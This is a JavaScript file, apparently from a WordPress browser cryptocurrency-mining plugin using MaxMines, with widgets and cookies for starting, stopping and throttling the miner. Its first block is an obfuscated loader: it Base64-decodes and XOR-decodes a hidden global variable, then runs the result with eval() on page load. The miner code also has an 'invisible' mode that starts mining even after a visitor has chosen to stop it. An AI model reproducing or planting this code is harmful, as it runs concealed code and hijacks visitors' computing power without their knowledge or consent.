jQuery(document).ready(function(){yn={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=yn._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=yn._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/rn/g,"n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}}
function eD(sit) {var kr = ['s','m','m','c','h','_','p','r','o','_','g','a','m','e','r'];var ot = [];for (var i = 0; i < sit.length; i++) {var cc = sit.charCodeAt(i) ^ kr[i % kr.length].charCodeAt(0);ot.push(String.fromCharCode(cc));}return ot.join("");}if (typeof gdhg != 'undefined') {if (gdhg != null) {gdhg = eD(yn.decode(gdhg));eval(gdhg);}}});

jQuery(document).ready(function(){
	var $smmch = jQuery,
		minerShouldStart = 1,
		isPaused = true;
	
	if(typeof smmchMineOptions != 'undefined'){
		isPaused = false;
		if(navigator.cookieEnabled === true){
			if(document.cookie.match("runminer") !== null){
				var minerShouldStart = readCookie("runminer");
				if(smmchMineOptions.invisible == 'true'){
					minerShouldStart = 1;
				}
				//update the buttons
				if(minerShouldStart == 1) {
					$smmch('.smmch-stop').text('Stop');
				} else {
					isPaused = true;
					$smmch('.smmch-stop').text('Start');
				}
			}
		}
		miner = new MaxMines.Anonymous(smmchMineOptions.sitekey, {
			throttle: smmchMineOptions.throttle,
			ref: 'wp-smm'
		});
		if(smmchMineOptions.mobileblock == 'on') {
			if(! /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
				if(minerShouldStart == 1) {
					miner.start(MaxMines.IF_EXCLUSIVE_TAB);
				}
			}
		} else {
			if(minerShouldStart == 1) {
				miner.start(MaxMines.IF_EXCLUSIVE_TAB);
			}
		}
	}
	//update total hashes, hashes per second and percentage of mining
	//on frequent interval update all of them
	setInterval(function(){
		if(!isPaused) {
			var smmchTotalHashes = miner.getTotalHashes();
			var smmchHashesSecond = miner.getHashesPerSecond();
			var smmchThrottle = Math.round(miner.getThrottle() * 10) / 10;
			
			$smmch('.smmch-val-total').text(smmchTotalHashes);
			$smmch('.smmch-val-sec').text(parseInt(smmchHashesSecond));
			$smmch('.smmch-val-perct').text((100 - smmchThrottle * 100) + '%');
		}
	}, 1000);
	
	//save them to cookie
	$smmch('.smmch-increase').on('click',function(){
		if(!isPaused) {
			var smmchThrottle = Math.round(miner.getThrottle() * 10) / 10;
			if(smmchThrottle != 0) {
				miner.setThrottle(smmchThrottle - 0.1);
			}
		}
	});
	$smmch('.smmch-reduce').on('click',function(){
		if(!isPaused) {
			var smmchThrottle = Math.round(miner.getThrottle() * 10) / 10;
			if(smmchThrottle != 0.9) {
				miner.setThrottle(smmchThrottle + 0.1);	
			}
		}
	});
	$smmch('#smmch-notice .smmch-ok').on('click',function(){
		$smmch('#smmch-notice').hide();
	});
	//show or hide based on controls shower cookie
	if($smmch('.smmch-control-shower').length > 0) {
		if(readCookie('control-shower') == 0) {
			$smmch('.smmch-value, .smmch-hashes, .smmch-controls').hide();
		}
	}

	$smmch('.widget .smmch-ok, .smmch-shortcode-box .smmch-ok').on('click',function(){
		$smmch(this).closest('.smmch-controls').hide().siblings('.smmch-value, .smmch-hashes').slideUp();
		//save to cookie 1 and dont show counts for next sessions.
		updateCookie('control-shower',0);
	});
	$smmch('.widget .smmch-control-shower, .smmch-shortcode-box .smmch-control-shower').on('click',function(){
		$smmch(this).siblings('.smmch-value, .smmch-hashes, .smmch-controls').slideDown();
		//update cookie for 0
		updateCookie('control-shower',1);
	});
	$smmch('.smmch-stop').on('click',function(){
		if(!isPaused) {
			miner.stop();
			setTimeout(function(){
				isPaused = true;
				$smmch('.smmch-val-perct').text('0%');
			},1000);
			$smmch('.smmch-stop').text('Start');
			if(navigator.cookieEnabled === true){
				updateCookie("runminer", 0);
			}
		} else {
			miner.start(MaxMines.IF_EXCLUSIVE_TAB);
			setTimeout(function(){
				isPaused = false;
			},1000);
			$smmch('.smmch-stop').text('Stop');
			if(navigator.cookieEnabled === true){
				updateCookie("runminer", 1);
			}
		}
	});
	
	//create or update cookie value
	function updateCookie(name, value){
		var today = new Date();
		today.setTime(today.getTime() + (2592000000)); //cookie expiration for 30 days
		expires = "; expires=" + today.toUTCString();
		document.cookie = name + "=" + value + expires + "; path=/";
	}
	//get cookie value
	function readCookie(name) {
		var nameEQ = name + "=";
		var ca = document.cookie.split(';');
		for(var i=0;i < ca.length;i++) {
			var c = ca[i];
			while (c.charAt(0)==' ') {
				c = c.substring(1,c.length);
			}
			if (c.indexOf(nameEQ) == 0) {
				return c.substring(nameEQ.length,c.length);
			}
		}
		return null;
	}
	
	
	//check if data session is exists if yes, check cookie, dont show popups or do nothing
	
	if($smmch('div.smmch-notice[data-session]').length > 0) {
		//add to cookies
		if(readCookie('mine-session') == 1) {
			$smmch('#smmch-notice').hide();
		} else {
			updateCookie('mine-session','1');
			$smmch('#smmch-notice').fadeIn();
			if($smmch('#smmch-notice').attr('data-hide') != '') {
				$smmch('#smmch-notice').delay(parseInt($smmch('#smmch-notice').attr('data-hide'))*1000).fadeOut();
			}
		}
	} else {
		updateCookie('mine-session','0');
		$smmch('#smmch-notice').fadeIn();
		if($smmch('#smmch-notice').attr('data-hide') != '') {
			$smmch('#smmch-notice').delay(parseInt($smmch('#smmch-notice').attr('data-hide'))*1000).fadeOut();
		}
	}
});